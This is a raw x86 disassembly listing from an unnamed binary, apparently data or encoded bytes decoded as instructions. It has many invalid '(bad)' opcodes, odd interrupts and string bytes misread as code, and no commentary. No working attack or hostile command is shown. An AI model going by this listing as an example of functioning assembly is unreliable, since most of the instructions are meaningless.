  427aa1:	mov    ebp,0x8725230a
  427aa6:	lock int 0xe6
  427aa9:	and    al,0x1b
  427aab:	aad    0x53
  427aad:	rcl    BYTE PTR [esi-0x43],cl
  427ab0:	or     ah,BYTE PTR [ebx]
  427ab2:	and    eax,0x12025370
  427ab7:	not    esi
  427ab9:	aaa    
  427aba:	ficom  WORD PTR [ebx]
  427abc:	cwde   
  427abd:	add    dh,dl
  427abf:	xor    al,0x0
  427ac1:	(bad)  
  427ac2:	sub    al,0x9a
  427ac4:	add    dh,dl
  427ac6:	sbb    al,0x0
  427ac8:	(bad)  
  427ac9:	adc    al,0x0
  427acb:	(bad)  
  427acc:	xor    BYTE PTR [eax],al
  427ace:	(bad)  
  427acf:	dec    esp
  427ad0:	add    dh,dl
  427ad2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ad8:	or     cl,BYTE PTR [ebx-0x57557433]
  427ade:	arpl   bx,cx
  427ae0:	sar    BYTE PTR [eax+eax*4],cl
  427ae3:	int    0x96
  427ae5:	mov    ch,cl
  427ae7:	(bad)  
  427ae8:	dec    esp
  427ae9:	int    0xe6
  427aeb:	mov    ch,cl
  427aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aee:	dec    esp
  427aef:	cmp    esp,ebx
  427af1:	cmp    edx,DWORD PTR [ecx]
  427af3:	das    
  427af4:	inc    ebp
  427af5:	sti    
  427af6:	xchg   edx,eax
  427af7:	shr    ecx,cl
  427af9:	sub    BYTE PTR [edx],dl
  427afb:	clc    
  427afc:	add    BYTE PTR [eax-0x102c9380],0x92
  427b03:	cmp    ebx,ebp
  427b05:	push   ebx
  427b06:	aad    0x53
  427b08:	clc    
  427b09:	int    0xe6
  427b0b:	xor    ch,cl
  427b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b0e:	adc    al,0x53
  427b10:	fst    DWORD PTR [ebx-0xc]
  427b13:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b19:	int    0x96
  427b1b:	cmp    al,0xcd
  427b1d:	(bad)  
  427b1e:	inc    esp
  427b1f:	int    0x96
  427b21:	xor    ch,cl
  427b23:	(bad)  
  427b24:	adc    al,0xcd
  427b26:	xchg   esi,eax
  427b27:	mov    ch,cl
  427b29:	(bad)  
  427b2a:	dec    esp
  427b2b:	int    0x96
  427b2d:	mov    ch,cl
  427b2f:	(bad)  
  427b30:	dec    esp
  427b31:	int    0xe6
  427b33:	mov    ch,cl
  427b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b36:	dec    esp
  427b37:	cmp    esp,ebx
  427b39:	cmp    edx,DWORD PTR [ecx]
  427b3b:	das    
  427b3c:	inc    ebp
  427b3d:	sti    
  427b3e:	xchg   edx,eax
  427b3f:	shr    ecx,cl
  427b41:	sub    BYTE PTR [edx],dl
  427b43:	clc    
  427b44:	add    BYTE PTR [eax-0x22c49380],0x53
  427b4b:	aad    0xd3
  427b4d:	out    dx,eax
  427b4e:	xchg   edx,eax
  427b4f:	push   ebx
  427b50:	clc    
  427b51:	int    0xe6
  427b53:	xor    ch,cl
  427b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b56:	adc    al,0x3b
  427b58:	cli    
  427b59:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b5f:	lea    edx,[edi+ebp*1]
  427b62:	inc    ebp
  427b63:	loope  0x427af7
  427b65:	cmp    ecx,ebx
  427b67:	push   ebx
  427b68:	cli    
  427b69:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b6f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b74:	push   ebx
  427b75:	popf   
  427b76:	int    0x76
  427b78:	cmp    al,0xcd
  427b7a:	lea    eax,[edi+eax*4-0x27]
  427b7e:	int    0xe6
  427b80:	cmp    al,0x1b
  427b82:	hlt    
  427b83:	int    0xa6
  427b85:	inc    esp
  427b86:	adc    al,BYTE PTR [edx]
  427b88:	mov    ebp,0x5625230a
  427b8d:	jnp    0x427bc6
  427b8f:	ficom  WORD PTR [ebx]
  427b91:	das    
  427b92:	inc    ebp
  427b93:	jge    0x427b27
  427b95:	shr    ecx,cl
  427b97:	sub    bl,dl
  427b99:	jmp    0x427b2d
  427b9b:	cmp    ebx,ebp
  427b9d:	adc    bh,al
  427b9f:	add    BYTE PTR [eax-0xfac9380],0x53
  427ba6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bac:	lea    ecx,[eax-0x32b36933]
  427bb2:	out    0x30,al
  427bb4:	int    0xa6
  427bb6:	adc    al,0x4
  427bb8:	repnz std 
  427bba:	add    al,0xe9
  427bbc:	std    
  427bbd:	adc    al,BYTE PTR [edx]
  427bbf:	aam    0x37
  427bc1:	ficom  WORD PTR [ebx]
  427bc3:	adc    bh,al
  427bc5:	aam    0x37
  427bc7:	ficom  WORD PTR [ebx]
  427bc9:	shr    edi,cl
  427bcb:	sub    BYTE PTR [ebx],bh
  427bcd:	ins    DWORD PTR es:[edi],dx
  427bce:	adc    bh,bl
  427bd0:	mov    ebp,0x1225230a
  427bd5:	hlt    
  427bd6:	mov    ebp,0x8725230a
  427bdb:	lock sbb edx,ebp
  427bde:	jmp    0x427c27
  427be0:	inc    DWORD PTR [eax]
  427be2:	add    BYTE PTR [esi-0x12fb1233],dl
  427be8:	sbb    al,0x98
  427bea:	pop    edi
  427beb:	(bad)  
  427bec:	aaa    
  427bed:	ficom  WORD PTR [ebx]
  427bef:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bf5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bfb:	jbe    0x427bba
  427bfd:	xchg   ecx,eax
  427bfe:	aaa    
  427bff:	ficom  WORD PTR [ebx]
  427c01:	or     dh,BYTE PTR [esi-0x13]
  427c04:	int    0x96
  427c06:	adc    ebp,ecx
  427c08:	(bad)  
  427c09:	cmc    
  427c0a:	call   0xefd3:0x92fb452f
  427c11:	xchg   edx,eax
  427c12:	int    0xd6
  427c14:	adc    ebp,ecx
  427c16:	out    0xf5,al
  427c18:	jo     0x427c2c
  427c1a:	sti    
  427c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c1c:	mov    esi,0x3b4229
  427c21:	jno    0x427c76
  427c23:	(bad)  [edx]
  427c25:	xchg   esi,eax
  427c26:	std    
  427c27:	int    0x96
  427c29:	dec    esp
  427c2a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c30:	iret   
  427c31:	jbe    0x427c30
  427c33:	add    dh,dl
  427c35:	mov    bl,dl
  427c37:	mov    ecx,0xd6007028
  427c3c:	dec    esp
  427c3d:	add    dh,dl
  427c3f:	in     eax,dx
  427c40:	add    dh,dl
  427c42:	mov    ebp,0xf5d600
  427c47:	(bad)  
  427c48:	adc    DWORD PTR [ebp+0xfde6],edi
  427c4e:	stos   BYTE PTR es:[edi],al
  427c4f:	or     dh,BYTE PTR [esi-0x3]
  427c52:	int    0x76
  427c54:	std    
  427c55:	test   al,0xcb
  427c57:	ror    BYTE PTR [eax-0x12326980],cl
  427c5d:	add    al,0xb5
  427c5f:	stc    
  427c60:	add    al,0xed
  427c62:	inc    esp
  427c63:	cwde   
  427c64:	leave  
  427c65:	je     0x427c9b
  427c67:	xor    al,0x80
  427c69:	add    BYTE PTR [eax+0x3474c980],0x44
  427c70:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c77:	xor    BYTE PTR [eax+0x0],dh
  427c7a:	(bad)  
  427c7b:	xor    al,0x0
  427c7d:	(bad)  
  427c7e:	sub    al,0x0
  427c80:	(bad)  
  427c81:	and    al,0x0
  427c83:	(bad)  
  427c84:	sbb    al,0x0
  427c86:	(bad)  
  427c87:	adc    al,0x0
  427c89:	(bad)  
  427c8a:	xor    BYTE PTR [eax],al
  427c8c:	(bad)  
  427c8d:	dec    esp
  427c8e:	add    dh,dl
  427c90:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c96:	int    0x76
  427c98:	mov    BYTE PTR [edx],cl
  427c9a:	je     0x427cd0
  427c9c:	test   ch,cl
  427c9e:	je     0x427cd4
  427ca0:	xor    al,0x6
  427ca2:	ins    DWORD PTR es:[edi],dx
  427ca3:	das    
  427ca4:	add    eax,0x80808017
  427ca9:	int    0x74
  427cab:	xor    al,0x44
  427cad:	push   es
  427cae:	ins    DWORD PTR es:[edi],dx
  427caf:	das    
  427cb0:	add    eax,0x8080800a
  427cb5:	add    ah,dl
  427cb7:	xor    al,0x24
  427cb9:	add    ah,dl
  427cbb:	xor    al,0x24
  427cbd:	add    ah,dl
  427cbf:	xor    al,0x24
  427cc1:	int    0x74
  427cc3:	xor    al,0x50
  427cc5:	add    cl,dh
  427cc7:	int    0x74
  427cc9:	xor    al,0x84
  427ccb:	int    0x74
  427ccd:	xor    al,0x84
  427ccf:	int    0x74
  427cd1:	xor    al,0x84
  427cd3:	iret   
  427cd4:	jbe    0x427c5a
  427cd6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cda:	int    0x74
  427cdc:	xor    al,0x3c
  427cde:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427ce2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427ce6:	int    0x74
  427ce8:	xor    al,0x84
  427cea:	int    0x74
  427cec:	xor    al,0x84
  427cee:	int    0x8c
  427cf0:	xor    al,0x84
  427cf2:	int    0xa
  427cf4:	and    eax,0xcd808081
  427cf9:	xor    ebp,ecx
  427cfb:	aam    0x34
  427cfd:	mov    ch,cl
  427cff:	add    DWORD PTR ds:0x5e808081,ebp
  427d05:	sbb    BYTE PTR [edi],ch
  427d07:	or     edx,DWORD PTR ds:0xcd808081
  427d0d:	xor    ch,cl
  427d0f:	push   eax
  427d10:	int    0x62
  427d12:	fs iret 
  427d14:	xchg   esp,eax
  427d15:	sbb    BYTE PTR [eax-0x33],dh
  427d18:	push   ecx
  427d19:	int    0x22
  427d1b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d21:	pop    esi
  427d22:	sbb    BYTE PTR [edi],ch
  427d24:	add    al,0x7b
  427d26:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d30:	dec    edx
  427d31:	int    0x80
  427d33:	xor    ecx,DWORD PTR [edi]
  427d35:	xchg   ebx,edx
  427d37:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d3d:	or     ch,0x74
  427d40:	xor    al,0x44
  427d42:	push   es
  427d43:	ins    DWORD PTR es:[edi],dx
  427d44:	das    
  427d45:	push   es
  427d46:	cwde   
  427d47:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d51:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d5b:	je     0x427d91
  427d5d:	test   ch,cl
  427d5f:	add    DWORD PTR ds:0xcd808081,esp
  427d65:	or     BYTE PTR [edx],0x74
  427d68:	xor    al,0x4c
  427d6a:	int    0x74
  427d6c:	xor    al,0x84
  427d6e:	int    0x1
  427d70:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d76:	int    0x80
  427d78:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d7c:	int    0x74
  427d7e:	xor    al,0x84
  427d80:	int    0x1
  427d82:	int3   
  427d83:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d8d:	dec    esp
  427d8e:	int    0x74
  427d90:	xor    al,0x84
  427d92:	int    0x8c
  427d94:	xor    al,0x84
  427d96:	int    0x1
  427d98:	popf   
  427d99:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427da3:	or     ch,0x89
  427da6:	imul   edx,ecx,0x3b358621
  427dac:	jns    0x427db2
  427dae:	add    bh,bh
  427db0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427db6:	push   ebx
  427db7:	jge    0x427dc3
  427db9:	mov    WORD PTR [esp+ecx*2],?
  427dbc:	leave  
  427dbd:	je     0x427df3
  427dbf:	mov    BYTE PTR [eax-0x327f7f80],al
  427dc5:	je     0x427dfb
  427dc7:	xor    al,0x6
  427dc9:	ins    DWORD PTR es:[edi],dx
  427dca:	aam    0x73
  427dcc:	int    0x74
  427dce:	xor    al,0x30
  427dd0:	add    al,0xbd
  427dd2:	adc    ah,0x52
  427dd5:	jl     0x427dab
  427dd7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427ddb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427ddf:	add    ah,dl
  427de1:	xor    al,0x2c
  427de3:	add    ah,dl
  427de5:	xor    al,0x2c
  427de7:	add    ah,dl
  427de9:	xor    al,0x2c
  427deb:	add    ah,dl
  427ded:	xor    al,0x2c
  427def:	int    0x74
  427df1:	xor    al,0x54
  427df3:	add    cl,dh
  427df5:	in     al,dx
  427df6:	cmp    BYTE PTR [eax],al
  427df8:	aam    0x34
  427dfa:	and    al,0x0
  427dfc:	aam    0x34
  427dfe:	and    al,0x0
  427e00:	aam    0x34
  427e02:	and    al,0xcd
  427e04:	je     0x427e3a
  427e06:	push   eax
  427e07:	add    cl,dh
  427e09:	in     al,dx
  427e0a:	and    al,BYTE PTR [eax]
  427e0c:	aam    0x34
  427e0e:	adc    al,0xcd
  427e10:	je     0x427e46
  427e12:	cmp    al,0x0
  427e14:	icebp  
  427e15:	in     al,dx
  427e16:	xchg   ch,cl
  427e18:	je     0x427e4e
  427e1a:	xor    al,0x0
  427e1c:	icebp  
  427e1d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e21:	int    0x74
  427e23:	xor    al,0x4c
  427e25:	push   es
  427e26:	ins    DWORD PTR es:[edi],dx
  427e27:	aam    0x4e
  427e29:	int    0x74
  427e2b:	xor    al,0x84
  427e2d:	leave  
  427e2e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e34:	and    DWORD PTR [esi+0x3474cd35],eax
  427e3a:	mov    ch,cl
  427e3c:	mov    WORD PTR [esp+eax*4],?
  427e3f:	int    0xa
  427e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e42:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e4c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e52:	mov    ch,cl
  427e54:	mov    WORD PTR [eax+ecx*4],?
  427e57:	cmp    edi,DWORD PTR [ecx+0x4]
  427e5a:	add    bh,bh
  427e5c:	shl    edx,cl
  427e5e:	sub    bl,dl
  427e60:	mov    ebp,0xcdd35392
  427e65:	mov    WORD PTR [esp+ecx*2],?
  427e68:	inc    ebx
  427e69:	rcl    esi,cl
  427e6b:	and    ecx,ebp
  427e6d:	je     0x427ea3
  427e6f:	test   ch,cl
  427e71:	mov    WORD PTR [esp+eax*4],?
  427e74:	int    0xa
  427e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e77:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e81:	add    BYTE PTR [eax],0x70
  427e84:	cmp    al,0xec
  427e86:	push   ds
  427e87:	iret   
  427e88:	jbe    0x427e0e
  427e8a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e8e:	int    0x74
  427e90:	xor    al,0x4c
  427e92:	int    0x8c
  427e94:	xor    al,0x84
  427e96:	int    0xa
  427e98:	in     al,0x81
  427e9a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427ea1:	je     0x427ed7
  427ea3:	test   ch,cl
  427ea5:	add    ebp,ebp
  427ea7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427eb1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427eb7:	or     bh,0x84
  427eba:	adc    cl,ch
  427ebc:	mov    WORD PTR [esp+eax*4],?
  427ebf:	int    0xa
  427ec1:	in     al,0x81
  427ec3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eca:	mov    BYTE PTR [eax-0x2d591833],ch
  427ed0:	sub    al,0x80
  427ed2:	lds    edx,FWORD PTR [eax+0x75]
  427ed5:	ins    BYTE PTR es:[edi],dx
  427ed6:	jae    0x427f4f
  427ed8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427edc:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ee0:	add    BYTE PTR [ecx+0x74],ah
  427ee3:	ins    BYTE PTR es:[edi],dx
  427ee4:	popa   
  427ee5:	inc    esp
  427ee6:	gs popa 
  427ee8:	fs push 0x6561686d
  427eee:	add    BYTE PTR fs:[ebp+0x74],ah
  427ef2:	push   0x65726143
  427ef7:	outs   dx,DWORD PTR ds:[esi]
  427ef8:	jns    0x427f60
  427efa:	add    BYTE PTR gs:[edi+0x72],dh
  427efe:	jns    0x427f6d
  427f00:	popa   
  427f01:	outs   dx,DWORD PTR ds:[esi]
  427f02:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f06:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f0a:	push   0x6f6d6568
  427f0f:	add    BYTE PTR fs:[edx+0x65],dl
  427f13:	arpl   WORD PTR [ebx+0x62],si
  427f16:	popa   
  427f17:	ins    BYTE PTR es:[edi],dx
  427f18:	jne    0x427f92
  427f1a:	gs jae 0x427f1d
  427f1d:	ins    DWORD PTR es:[edi],dx
  427f1e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f25:	outs   dx,DWORD PTR ds:[esi]
  427f26:	jb     0x427f97
  427f28:	jo     0x427f2a
  427f2a:	ja     0x427f8d
  427f2c:	gs je  0x427f9e
  427f2f:	jb     0x427fa0
  427f31:	bound  esp,QWORD PTR [ecx+0x70]
  427f34:	add    BYTE PTR [ebx+0x69],cl
  427f37:	outs   dx,BYTE PTR ds:[esi]
  427f38:	addr16 addr16 popa 
  427f3b:	outs   dx,BYTE PTR ds:[esi]
  427f3c:	arpl   WORD PTR [ecx+0x70],sp
  427f3f:	add    BYTE PTR [edi+0x6e],al
  427f42:	jne    0x427fb7
  427f44:	je     0x427fab
  427f46:	outs   dx,BYTE PTR ds:[esi]
  427f47:	push   esi
  427f48:	popa   
  427f49:	jb     0x427fc4
  427f4b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f4f:	jb     0x427fa1
  427f51:	popa   
  427f52:	ins    BYTE PTR es:[edi],dx
  427f53:	ins    DWORD PTR es:[edi],dx
  427f54:	je     0x427fbf
  427f56:	outs   dx,DWORD PTR ds:[esi]
  427f57:	ja     0x427fbe
  427f59:	jb     0x427f5b
  427f5b:	jo     0x427fc2
  427f5d:	ins    DWORD PTR es:[edi],dx
  427f5e:	jns    0x427fd4
  427f60:	push   0x6f656562
  427f65:	outs   dx,BYTE PTR ds:[esi]
  427f66:	push   eax
  427f67:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f6e:	inc    ebx
  427f6f:	outs   dx,DWORD PTR ds:[esi]
  427f70:	popa   
  427f71:	ins    BYTE PTR es:[edi],dx
  427f72:	popa   
  427f73:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f7a:	je     0x427ff5
  427f7c:	outs   dx,DWORD PTR gs:[esi]
  427f7e:	outs   dx,BYTE PTR ds:[esi]
  427f7f:	gs ins BYTE PTR es:[edi],dx
  427f81:	inc    ebx
  427f82:	push   0x54007261
  427f87:	jns    0x427ff9
  427f89:	jns    0x427ff8
  427f8b:	jne    0x427ff2
  427f8d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f91:	outs   dx,DWORD PTR ds:[esi]
  427f92:	je     0x427fd6
  427f94:	gs gs jb 0x428008
  427f98:	outs   dx,DWORD PTR ds:[esi]
  427f99:	je     0x428006
  427f9b:	imul   eax,DWORD PTR [eax],0x616c7548
  427fa1:	jo     0x42800c
  427fa3:	popa   
  427fa4:	ins    BYTE PTR es:[edi],dx
  427fa5:	dec    ebx
  427fa6:	outs   dx,BYTE PTR ds:[esi]
  427fa7:	popa   
  427fa8:	jo     0x428023
  427faa:	add    BYTE PTR gs:[eax+0x6f],dh
  427fae:	je     0x427ff2
  427fb0:	gs ins BYTE PTR es:[edi],dx
  427fb2:	jae    0x428023
  427fb4:	js     0x427fb6
  427fb6:	popa   
  427fb7:	data16 je 0x428000
  427fba:	ins    BYTE PTR es:[edi],dx
  427fbb:	popa   
  427fbc:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fc0:	gs jae 0x428024
  427fc3:	jb     0x427fc5
  427fc5:	inc    edx
  427fc6:	ins    BYTE PTR es:[edi],dx
  427fc7:	popa   
  427fc8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427fcc:	je     0x428034
  427fce:	ins    BYTE PTR es:[edi],dx
  427fcf:	jns    0x428046
  427fd1:	push   0x6d6d6800
  427fd6:	popa   
  427fd7:	inc    edi
  427fd8:	popa   
  427fd9:	ins    BYTE PTR es:[edi],dx
  427fda:	ins    BYTE PTR es:[edi],dx
  427fdb:	push   0x48007361
  427fe0:	outs   dx,DWORD PTR ds:[esi]
  427fe1:	ins    DWORD PTR es:[edi],dx
  427fe2:	outs   dx,DWORD PTR gs:[esi]
  427fe4:	jb     0x42804b
  427fe6:	data16 jno 0x428052
  427fe9:	jae    0x42804c
  427feb:	bound  esi,QWORD PTR [eax+0x61]
  427fee:	add    BYTE PTR [ebp+0x74],ah
  427ff1:	outs   dx,BYTE PTR ds:[esi]
  427ff2:	gs addr16 jbe 0x428057
  427ff6:	je     0x428071
  427ff8:	gs popa 
  427ffa:	add    BYTE PTR [ebp+0x67],ah
  427ffd:	outs   dx,DWORD PTR ds:[esi]
  427ffe:	inc    edi
  427fff:	popa   
  428000:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428008:	jo     0x42806f
  42800a:	fs jbe 0x42806e
  42800d:	je     0x428084
  42800f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428013:	outs   dx,DWORD PTR ds:[esi]
  428014:	add    BYTE PTR [edx+0x0],ch
  428017:	jne    0x428019
  428019:	add    BYTE PTR [bp+0x0],ch
  42801d:	popa   
  42801e:	add    BYTE PTR [esi+0x0],ch
  428021:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428026:	add    BYTE PTR [ebp+0x0],dh
  428029:	ins    DWORD PTR es:[edi],dx
  42802a:	add    BYTE PTR [eax],al
  42802c:	add    BYTE PTR [edi+0x0],ch
  42802f:	jb     0x428031
  428031:	ja     0x428033
  428033:	imul   eax,DWORD PTR [eax],0x680073
  428039:	outs   dx,BYTE PTR ds:[esi]
  42803a:	add    BYTE PTR [ecx+0x0],ch
  42803d:	add    BYTE PTR fs:[ecx+0x0],ch
  428041:	ja     0x428043
  428043:	imul   eax,DWORD PTR [eax],0x65006e
  428049:	push   0x70000000
  42804e:	add    BYTE PTR [ecx+0x0],ah
  428051:	je     0x428053
  428053:	jbe    0x428055
  428055:	add    BYTE PTR gs:[ebp+0x0],ah
  428059:	je     0x42805b
  42805b:	add    BYTE PTR gs:[edi+0x0],ah
  42805f:	ins    BYTE PTR es:[edi],dx
  428060:	add    BYTE PTR [ecx+0x0],ah
  428063:	imul   eax,DWORD PTR [eax],0x66
  428069:	outs   dx,DWORD PTR ds:[esi]
  42806a:	add    BYTE PTR [esi+0x0],ch
  42806d:	je     0x42806f
  42806f:	popa   
  428070:	add    BYTE PTR [edi+0x0],dh
  428073:	push   ebx
  428074:	add    BYTE PTR [edi+0x0],ch
  428077:	arpl   WORD PTR [eax],ax
  428079:	imul   eax,DWORD PTR [eax],0x61
  42807c:	add    BYTE PTR [esi+0x0],dh
  42807f:	outs   dx,DWORD PTR ds:[esi]
  428080:	add    BYTE PTR [eax],al
  428082:	add    BYTE PTR [ebp+0x0],ch
  428085:	jns    0x428087
  428087:	add    BYTE PTR gs:[esi+0x0],ah
  42808b:	ins    BYTE PTR es:[edi],dx
  42808c:	add    BYTE PTR [ecx+0x0],ah
  42808f:	jns    0x428091
  428091:	jbe    0x428093
  428093:	popa   
  428094:	add    BYTE PTR [esi+0x0],ch
  428097:	popa   
  428098:	add    BYTE PTR [edi+0x0],ah
  42809b:	outs   dx,DWORD PTR ds:[esi]
  42809c:	add    BYTE PTR [eax],al
  42809e:	add    BYTE PTR [edi+0x0],ch
  4280a1:	jb     0x4280a3
  4280a3:	jae    0x4280a5
  4280a5:	imul   eax,DWORD PTR [eax],0x47006e
  4280ab:	imul   eax,DWORD PTR [eax],0x70006d
  4280b1:	bound  eax,QWORD PTR [eax]
  4280b3:	outs   dx,DWORD PTR ds:[esi]
  4280b4:	add    BYTE PTR [eax+0x0],dh
  4280b7:	imul   eax,DWORD PTR [eax],0x650000
  4280bd:	js     0x4280bf
  4280bf:	jae    0x4280c1
  4280c1:	outs   dx,DWORD PTR ds:[esi]
  4280c2:	add    BYTE PTR [ebx+0x0],dh
  4280c5:	popa   
  4280c6:	add    BYTE PTR [esi+0x0],ch
  4280c9:	je     0x4280cb
  4280cb:	add    BYTE PTR [eax],al
  4280cd:	bound  eax,QWORD PTR [eax]
  4280cf:	jns    0x4280d1
  4280d1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280d6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280da:	add    BYTE PTR [ecx+0x0],ah
  4280dd:	add    BYTE PTR [eax],al
  4280df:	js     0x4280e1
  4280e1:	imul   eax,DWORD PTR [eax],0x610054
  4280e7:	imul   eax,DWORD PTR [eax],0x48006e
  4280ed:	popa   
  4280ee:	add    BYTE PTR [esi+0x0],ch
  4280f1:	add    BYTE PTR fs:[eax],al
  4280f4:	add    BYTE PTR [edi+0x0],cl
  4280f7:	ja     0x4280f9
  4280f9:	ins    BYTE PTR es:[edi],dx
  4280fa:	add    BYTE PTR [ebx+0x0],dh
  4280fd:	popa   
  4280fe:	add    BYTE PTR [ebx+0x0],dh
  428101:	jo     0x428103
  428103:	popa   
  428104:	add    BYTE PTR [ecx+0x0],ch
  428107:	imul   eax,DWORD PTR [eax],0x72
  42810a:	add    BYTE PTR [ebp+0x0],ah
  42810d:	jbe    0x42810f
  42810f:	add    BYTE PTR [eax],al
  428111:	jb     0x428113
  428113:	jne    0x428115
  428115:	je     0x428117
  428117:	ins    DWORD PTR es:[edi],dx
  428118:	add    BYTE PTR [ebp+0x0],dh
  42811b:	arpl   WORD PTR [eax],ax
  42811d:	jne    0x42811f
  42811f:	jo     0x428121
  428121:	add    BYTE PTR [eax],al
  428123:	jae    0x428125
  428125:	outs   dx,DWORD PTR ds:[esi]
  428126:	add    BYTE PTR [esi+0x0],ah
  428129:	imul   eax,DWORD PTR [eax],0x630062
  42812f:	outs   dx,DWORD PTR ds:[esi]
  428130:	add    BYTE PTR [ecx+0x0],ch
  428133:	jb     0x428135
  428135:	jae    0x428137
  428137:	outs   dx,DWORD PTR ds:[esi]
  428138:	add    BYTE PTR [eax],al
  42813a:	add    BYTE PTR [ebx+0x0],dl
  42813d:	outs   dx,DWORD PTR ds:[esi]
  42813e:	add    BYTE PTR [ebx+0x0],ah
  428141:	popa   
  428142:	add    BYTE PTR [ecx+0x0],ch
  428145:	jae    0x428147
  428147:	data16 add BYTE PTR [ecx+0x0],ah
  42814b:	jb     0x42814d
  42814d:	popa   
  42814e:	add    BYTE PTR [ecx+0x0],ch
  428151:	add    BYTE PTR [eax],al
  428153:	add    BYTE PTR [esi],cl
  428155:	adc    BYTE PTR [eax],al
  428157:	out    0x67,eax
  428159:	adc    BYTE PTR [eax],al
  42815b:	js     0x428184
  42815d:	adc    BYTE PTR [eax],al
  42815f:	test   al,0x13
  428161:	adc    BYTE PTR [eax],al
  428163:	fs push esi
  428165:	adc    BYTE PTR [eax],al
  428167:	jp     0x428189
  428169:	adc    BYTE PTR [eax],al
  42816b:	enter  0x1052,0x0
  42816f:	loop   0x4281e4
  428171:	adc    BYTE PTR [eax],al
  428173:	ja     0x4281e0
  428175:	adc    BYTE PTR [eax],al
  428177:	cmp    al,0x2b
  428179:	adc    BYTE PTR [eax],al
  42817b:	rcl    BYTE PTR [edx],1
  42817d:	adc    BYTE PTR [eax],al
  42817f:	sbb    DWORD PTR [eax+0x10],ebx
  428182:	add    BYTE PTR [esi],ah
  428184:	add    dl,BYTE PTR [eax]
  428186:	add    BYTE PTR [edi+0xc],dh
  428189:	adc    BYTE PTR [eax],al
  42818b:	mov    dh,BYTE PTR [ecx]
  42818d:	adc    BYTE PTR [eax],al
  42818f:	out    dx,al
  428190:	sbb    eax,0xed80010
  428195:	adc    BYTE PTR [eax],al
  428197:	add    eax,0x3300107f
  42819c:	jbe    0x4281ae
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    BYTE PTR [edi-0x7f],bl
  4281ad:	inc    edx
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [edi-0x7f],bh
  4281cd:	inc    edx
  4281ce:	add    BYTE PTR [ebx-0x78ffbd7f],al
  4281d4:	add    DWORD PTR [edx+0x0],0x42818b
  4281db:	pop    DWORD PTR [ecx-0x7e6cffbe]
  4281e1:	inc    edx
  4281e2:	add    BYTE PTR [edi-0x64ffbd7f],dl
  4281e8:	add    DWORD PTR [edx+0x0],0x42822b
  4281ef:	das    
  4281f0:	add    BYTE PTR [edx+0x0],0x33
